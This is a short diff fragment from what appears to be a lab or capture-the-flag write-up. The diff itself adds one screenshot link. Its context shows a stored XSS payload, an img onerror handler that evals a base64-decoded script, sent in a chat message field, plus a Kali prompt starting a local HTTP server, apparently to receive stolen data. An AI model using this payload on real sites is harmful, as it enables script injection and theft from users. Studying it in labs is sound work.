@@ -69,7 +69,7 @@ socket.emit('client_message', 'history');
 
 - the atob func will decode base64
 `{"first_name":"a","last_name":"asdf","message":"<img src=x onerror=\"eval(atob('<payload encode base64>'))\">"}`
-
+![img2](./img/img2.png)
 ```shell
 ┌──(toan㉿kali)-[~]
 └─$ python -m http.server 8888
